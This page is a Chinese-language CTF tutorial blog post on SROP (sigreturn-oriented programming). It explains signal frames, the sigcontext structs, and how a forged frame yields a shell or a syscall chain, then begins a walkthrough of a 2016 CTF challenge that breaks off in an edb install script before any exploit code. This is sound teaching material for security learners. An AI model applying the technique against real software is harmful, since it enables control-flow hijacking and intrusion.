<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（1-3-10）-高级ROP-SROP | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107512670  signal 机制signal 机制是类 unix 系统中进程之间**相互传递信息**的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、  kill 可不是字面意思–杀死进程KILL">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（1-3-10）-高级ROP-SROP">
<meta property="og:url" content="https://cyberangel.cn/2020/08/24/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;107512670  signal 机制signal 机制是类 unix 系统中进程之间**相互传递信息**的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、  kill 可不是字面意思–杀死进程KILL">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-08-24T03:31:00.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:17.190Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/08/24/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（1-3-10）-高级ROP-SROP',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（1-3-10）-高级ROP-SROP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-08-24T03:31:00.000Z" title="发表于 2020-08-24 11:31:00">2020-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:17.190Z" title="更新于 2021-07-04 17:57:17">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（1-3-10）-高级ROP-SROP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/08/24/PWN%E5%85%A5%E9%97%A8%EF%BC%881-3-10%EF%BC%89-%E9%AB%98%E7%BA%A7ROP-SROP/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/107512670">https://blog.csdn.net/qq_41202237/article/details/107512670</a></p>
</blockquote>
<h1 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h1><p><strong>signal 机制是类 unix 系统中进程之间**<strong>相互传递信息*</strong>*的一种方法。</strong>一般，我们也称其为<strong>软中断信号</strong>，或者<strong>软中断</strong>。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般分为三大步：、</p>
<blockquote>
<p>kill 可不是字面意思–杀死进程<br><strong>KILL 功能描述：用于向任何进程组或进程发送信号。</strong></p>
</blockquote>
<p>① 内核向某个进程<strong>发送 signal 机制</strong>，该进程会被暂时<strong>挂起</strong>，<strong>进入内核态</strong><br>② 内核会为该进程保存相应的上下文，<strong>跳转到之前注册好的 signal handler 中处理 signal</strong><br>③ <strong>signal 返回</strong><br>④ 内核为进程恢复之前保留的上下文，恢复进程的执行<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598239928005-92bbf6dd-56db-432d-90c7-6aeb49bfabaf.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&originHeight=266&originWidth=816&size=0&status=done&style=none&width=816"></p>
<ol>
<li><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p>
</li>
<li><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为<strong>Signal Frame</strong>。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p>
</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598239928334-6b709e70-5bde-4b24-96fc-4d59957229e2.png#align=left&display=inline&height=364&margin=%5Bobject%20Object%5D&originHeight=590&originWidth=711&size=0&status=done&style=none&width=439"><br>对于 signal Frame 来说，不同会因为架构的不同而因此有所区别，这里给出分别给出 x86 以及 x64 的 sigcontext:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x86</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs, __gsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs, __fsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> es, __esh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ds, __dsh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs, __csh;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x64</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">  <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">  <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">  <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">  <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15。</p>
<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p>
<ul>
<li><strong>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</strong></li>
<li>由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，<strong>所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</strong></li>
</ul>
<p>说到这里，其实，SROP 的基本利用原理也就出现了。下面举两个简单的例子。</p>
<h2 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h2><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598252882215-a549c428-3497-43d6-aeb0-546dc6e25204.png#align=left&display=inline&height=672&margin=%5Bobject%20Object%5D&originHeight=672&originWidth=691&size=0&status=done&style=none&width=691"><br>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p>
<h2 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h2><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
<ul>
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li>
</ul>
<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598252939278-77c21600-42e5-4240-8cc5-43f7e68fe4a2.png#align=left&display=inline&height=528&margin=%5Bobject%20Object%5D&originHeight=528&originWidth=1023&size=0&status=done&style=none&width=1023"></p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>需要注意的是，我们在构造 ROP 攻击的时候，需要满足下面的条件</p>
<ul>
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li><strong>需要知道相应的地址</strong><ul>
<li><strong>“/bin/sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscal</strong></li>
<li><strong>sigreturn</strong></li>
</ul>
</li>
<li>需要有够大的空间来塞下整个 sigal frame</li>
</ul>
<p>此外，关于 sigreturn 以及 syscall;ret 这两个 gadget 在上面并没有提及。提出该攻击的论文作者发现了这些 gadgets 出现的某些地址：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598252941548-b840ddcb-b5c4-437d-97bb-c23a18036009.png#align=left&display=inline&height=398&margin=%5Bobject%20Object%5D&originHeight=398&originWidth=793&size=0&status=done&style=none&width=793"><br>并且，作者发现，有些系统上 SROP 的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在 Debian 7.0， Ubuntu Long Term Support， CentOS 6 系统中默认内核），可以直接在 vsyscall 中的固定地址处找到 syscall&amp;return 代码片段。如下<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598252939417-6d013ea4-064a-4202-9843-9d981d030da1.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&originHeight=448&originWidth=789&size=0&status=done&style=none&width=789"><br>但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启 ASLR 保护，所以相对来说这些 gadgets 都并不容易找到。<br><strong>值得一说的是，对于 sigreturn 系统调用来说，在 64 位系统中，sigreturn 系统调用对应的系统调用号为 15，只需要 RAX=15，并且执行 syscall 即可实现调用 syscall 调用。而 RAX 寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说 read 函数的返回值为读取的字节数。</strong></p>
<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><strong>在目前的 pwntools 中已经集成了对于 srop 的攻击。</strong></p>
<h1 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h1><p>在汇编代码中看到存在 systemcall 的时候可以考虑采用该方法进行尝试<br>下面给出我们将会用到的 64 位函数及函数调用号和函数原型</p>
<table>
<thead>
<tr>
<th>系统调用</th>
<th>调用号</th>
<th>函数原型</th>
</tr>
</thead>
<tbody><tr>
<td>read</td>
<td>0</td>
<td>read( int fd, void *buf, size_t count )</td>
</tr>
<tr>
<td>write</td>
<td>1</td>
<td>write( int fd, const void *buf, size_t count )</td>
</tr>
<tr>
<td>sigreturn</td>
<td>15</td>
<td>int sigreturn( … )</td>
</tr>
<tr>
<td>execve</td>
<td>59</td>
<td>execve( const char *filename, char *const argv[], char *const envp[] )</td>
</tr>
</tbody></table>
<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><blockquote>
<p>附件下载：<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/srop/2016-360%E6%98%A5%E7%A7%8B%E6%9D%AF-srop</a></p>
</blockquote>
<p>将文件下载下来，检查一下文件的保护情况：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598240775225-fbb44684-97fa-4568-94df-7396f85987c4.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824114607.png&originHeight=139&originWidth=451&size=21533&status=done&style=none&width=451" alt="QQ截图20200824114607.png"><br>64 位程序，只开启了 NX 保护，这意味着我们不能在栈上注入 shellcode<br>将文件扔到 IDA 中：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1598240875785-43a0c018-3ca0-44fb-9a8c-b9c3fad4dce1.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200824114746.png&originHeight=217&originWidth=960&size=22616&status=done&style=none&width=960" alt="QQ截图20200824114746.png"><br>emmm，这就是 pwn 吗？只给了这么一小段代码来 getshell。爱了爱了…<br>将汇编代码摘出来，加上注释我们看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span>     rax, rax       #异或rax，相当于把rax清零</span><br><span class="line">mov     edx, <span class="number">400</span>h      #将<span class="number">400</span>h放入rdx的低<span class="number">16</span>位edx中</span><br><span class="line">mov     rsi, rsp       #将栈顶的内容赋值给rsi</span><br><span class="line">mov     rdi, rax       #将rax==<span class="number">0</span>赋值给rdi中</span><br><span class="line">syscall                #执行系统调用</span><br><span class="line">retn                   #函数返回，pop rip（rsp+<span class="number">8</span>）</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 64 位程序中，函数的一参存放在 rdi 寄存器中，二参存放在 rsi 寄存器中，三参存放在 rdx 寄存器中。</p>
</blockquote>
<p>从上面的代码可以看到，rdi、rsi、rdx 三个寄存器分别存放了系统调用的三个参数。<br>因为在 64 位程序中系统调用号为 0 的函数为 read 函数，所以实际上上述的代码执行的是 syscall(0, 0, rsp, 0x400)，也就是 read(0, rsp, 0x400)，向栈顶读入 0x400 字节的内容。<br>由于读入的数据过大,毫无疑问,会发生栈溢出.<br>我们使用 edb 来调试一下，这是一个基于 Linux 的 elf 文件调试器。</p>
<blockquote>
<p>edb 和 Windows 上的 OD 使用差不多，这里就不再过多的介绍了</p>
</blockquote>
<hr>
<p>什么？你问 edb 的安装方式？<br>答：<a target="_blank" rel="noopener" href="https://github.com/eteran/edb-debugger">https://github.com/eteran/edb-debugger</a><br>附上 Ubuntu &gt;= 15.10 的安装脚本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> install dependencies</span></span><br><span class="line">sudo apt-get install       \</span><br><span class="line">    cmake                  \</span><br><span class="line">    build-essential        \</span><br><span class="line">    libboost-dev           \</span><br><span class="line">    libqt5xmlpatterns5-dev \</span><br><span class="line">    qtbase5-dev            \</span><br><span class="line">    qt5-default            \</span><br><span class="line">    libqt5svg5-dev         \</span><br><span class="line">    libgraphviz-dev        \</span><br><span class="line">    libcapstone-dev        \</span><br><span class="line">    pkg-config</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span 